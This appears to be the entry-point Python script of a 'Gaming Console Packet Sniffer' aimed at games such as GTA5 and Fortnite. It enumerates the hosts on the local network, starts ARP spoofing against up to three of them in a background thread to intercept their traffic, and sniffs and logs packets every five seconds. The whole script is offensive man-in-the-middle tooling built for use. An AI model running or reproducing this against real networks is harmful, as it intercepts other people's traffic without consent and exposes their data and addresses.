#!/usr/bin/env python3
"""Gaming-oriented packet sniffer — on Linux run with sudo or grant cap_net_raw (see README)."""

import signal
import sys
import threading
import time

from arp_spoof import ARPSpoofer
from config import ARP_SPOOFING, INTERFACE, TARGET_GAMES
from sniffer import PacketSniffer
from utils import display_results, save_to_log


def signal_handler(_sig, _frame):
    print("\n[!] Sniffer stopped by user")
    sys.exit(0)


def main():
    print(
        """
    ██████╗ ██████╗ ███╗   ██╗███████╗ ██████╗ ██╗     ███████╗
    ██╔════╝██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██║     ██╔════╝
    ██║     ██║   ██║██╔██╗ ██║███████╗██║   ██║██║     ███████╗
    ██║     ██║   ██║██║╚██╗██║╚════██║██║   ██║██║     ╚════██║
    ███████╗╚██████╔╝██║ ╚████║███████║╚██████╔╝███████╗███████║
    ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚══════╝╚══════╝

    Gaming Console Packet Sniffer v1.0
    Targeted Games: GTA5, RDR2, Battlefront2, Fortnite, Wo Long
    """
    )

    signal.signal(signal.SIGINT, signal_handler)

    if ARP_SPOOFING:
        spoofer = ARPSpoofer(interface=INTERFACE)
        target_ips = spoofer.get_network_hosts()
        if not target_ips:
            print("[!] No LAN hosts found. ARP spoofing skipped; sniff-only mode.")
        else:
            print(f"[+] Found {len(target_ips)} potential targets; spoofing up to 3.")
            threading.Thread(
                target=lambda: spoofer.start_spoofing(target_ips[:3]),
                daemon=True,
            ).start()

    sniffer = PacketSniffer(interface=INTERFACE, target_games=TARGET_GAMES)
    threading.Thread(target=sniffer.start_sniffing, daemon=True).start()

    print("[+] Sniffer running. Press Ctrl+C to stop.\n")

    while True:
        results = sniffer.get_results()
        display_results(results)
        save_to_log(results)
        time.sleep(5)


if __name__ == "__main__":
    main()
